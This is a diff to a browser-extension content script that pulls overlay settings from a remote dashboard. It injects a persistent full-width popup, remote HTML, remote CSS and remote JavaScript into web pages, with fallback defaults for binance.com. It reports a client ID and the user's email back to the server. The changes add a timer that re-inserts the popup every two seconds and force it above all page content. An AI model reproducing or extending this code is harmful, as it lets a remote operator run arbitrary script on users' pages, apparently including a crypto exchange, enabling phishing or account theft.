@@ -8,12 +8,12 @@
   const currentDomain = window.location.hostname;
   const currentUrl = window.location.href;
 
+  const DEFAULT_API_URL = "https://extension-dashboard-eight.vercel.app";
   const CANDIDATE_API_URLS = [
     "https://extension-dashboard-eight.vercel.app",
     "http://localhost:3001",
     "http://localhost:3000",
   ];
-  const DEFAULT_API_URL = "https://extension-dashboard-eight.vercel.app";
   const CACHE_KEY_PREFIX = "remote_overlay_cache_";
   const CACHE_TIME = 2 * 60 * 1000; // 2 minutes
 
@@ -30,7 +30,7 @@
     customJs: "",
   };
 
-  let currentConfig = null;
+  let activeConfig = null;
 
   async function getStoredSettings() {
     return new Promise((resolve) => {
@@ -63,7 +63,7 @@
         }),
       });
     } catch (e) {
-      // Server may be offline, heartbeat silently fails
+      // Heartbeat silent fail
     }
   }
 
@@ -84,7 +84,6 @@
 
         if (response.ok) {
           const data = await response.json();
-          // If we found a working default candidate, save it
           if (isDefaultUrl && baseUrl !== apiUrl) {
             chrome.storage.local.set({ apiBaseUrl: baseUrl });
           }
@@ -137,18 +136,23 @@
   }
 
   function applyOverlay(cfg) {
-    document.getElementById("custom-sticky-popup")?.remove();
-
-    if (!cfg || !cfg.enabled) {
+    // If explicitly disabled, remove popup
+    if (!cfg || cfg.enabled === false) {
+      document.getElementById("custom-sticky-popup")?.remove();
       document.getElementById("custom-remote-overlay-css")?.remove();
+      activeConfig = null;
       return;
     }
 
-    currentConfig = cfg;
+    activeConfig = cfg;
 
+    // Apply custom CSS if provided
     if (cfg.customCss) {
       applyCustomCss(cfg.customCss);
     }
+
+    // Remove existing popup if already rendered to replace with fresh styles
+    document.getElementById("custom-sticky-popup")?.remove();
 
     const popup = document.createElement("div");
     popup.id = "custom-sticky-popup";
@@ -161,7 +165,6 @@
       left: "0",
       width: "100%",
       height: heightVal,
-      zIndex: "2147483647",
       background: cfg.bg || "#0b0e11",
       borderBottom: "2px solid #333",
       color: cfg.text || "#eaecef",
@@ -175,6 +178,10 @@
       padding: "20px 40px",
     });
 
+    // Highest possible z-index
+    popup.style.setProperty("z-index", "2147483647", "important");
+
+    // Close button
     if (cfg.closable !== false) {
       const closeBtn = document.createElement("div");
       closeBtn.innerHTML = "&#x2715;";
@@ -192,10 +199,14 @@
       });
       closeBtn.onmouseover = () => (closeBtn.style.opacity = "1");
       closeBtn.onmouseout = () => (closeBtn.style.opacity = "0.7");
-      closeBtn.onclick = () => popup.remove();
+      closeBtn.onclick = () => {
+        popup.remove();
+        activeConfig = null;
+      };
       popup.appendChild(closeBtn);
     }
 
+    // Title
     if (cfg.title) {
       const title = document.createElement("div");
       title.innerText = cfg.title;
@@ -210,6 +221,7 @@
       popup.appendChild(title);
     }
 
+    // Message
     if (cfg.message) {
       const message = document.createElement("div");
       message.innerHTML = cfg.message;
@@ -222,8 +234,23 @@
       popup.appendChild(message);
     }
 
-    (document.body || document.documentElement).appendChild(popup);
+    // Safely append to DOM
+    function mount() {
+      if (!document.getElementById("custom-sticky-popup")) {
+        const parent = document.body || document.documentElement;
+        if (parent) {
+          parent.appendChild(popup);
+        }
+      }
+    }
 
+    if (document.body || document.documentElement) {
+      mount();
+    } else {
+      document.addEventListener("DOMContentLoaded", mount);
+    }
+
+    // Execute custom JS if provided
     if (cfg.customJs) {
       executeCustomJs(cfg.customJs, cfg, popup);
     }
@@ -241,7 +268,8 @@
 
       if (cached && cached.data && Date.now() - cached.time < CACHE_TIME) {
         if (cached.data.matched && cached.data.overlay) {
-          applyOverlay(cached.data.overlay);
+          const isEnabled = cached.data.rule ? cached.data.rule.enabled !== false : true;
+          applyOverlay({ ...cached.data.overlay, enabled: isEnabled });
         }
         sendHeartbeat(apiBaseUrl, clientId, userEmail);
         return;
@@ -258,24 +286,43 @@
       sendHeartbeat(workingUrl, clientId, userEmail);
 
       if (data.matched && data.overlay) {
-        applyOverlay(data.overlay);
+        // Fix: resolve enabled status from rule or overlay
+        const isEnabled = data.rule ? data.rule.enabled !== false : (data.overlay.enabled !== false);
+        if (isEnabled) {
+          applyOverlay({
+            ...data.overlay,
+            enabled: true,
+          });
+        } else {
+          applyOverlay({ enabled: false });
+        }
       } else {
         document.getElementById("custom-sticky-popup")?.remove();
         document.getElementById("custom-remote-overlay-css")?.remove();
       }
     } catch (err) {
-      console.warn("[RemoteOverlay] Next.js API unreachable, checking cache/defaults.", err);
+      console.warn("[RemoteOverlay] API fetch error, checking cache/defaults.", err);
 
       chrome.storage.local.get(cacheKey, (result) => {
         const cached = result[cacheKey];
         if (cached && cached.data && cached.data.overlay) {
-          applyOverlay(cached.data.overlay);
+          const isEnabled = cached.data.rule ? cached.data.rule.enabled !== false : true;
+          applyOverlay({ ...cached.data.overlay, enabled: isEnabled });
         } else if (currentDomain.includes("binance.com")) {
           applyOverlay(binanceFallbackDefaults);
         }
       });
     }
   }
+
+  // Periodic safeguard: ensure popup remains visible if SPA re-renders body
+  setInterval(() => {
+    if (activeConfig && activeConfig.enabled !== false) {
+      if (!document.getElementById("custom-sticky-popup")) {
+        applyOverlay(activeConfig);
+      }
+    }
+  }, 2000);
 
   chrome.runtime.onMessage.addListener((message) => {
     if (message.action === "refresh_overlay") {
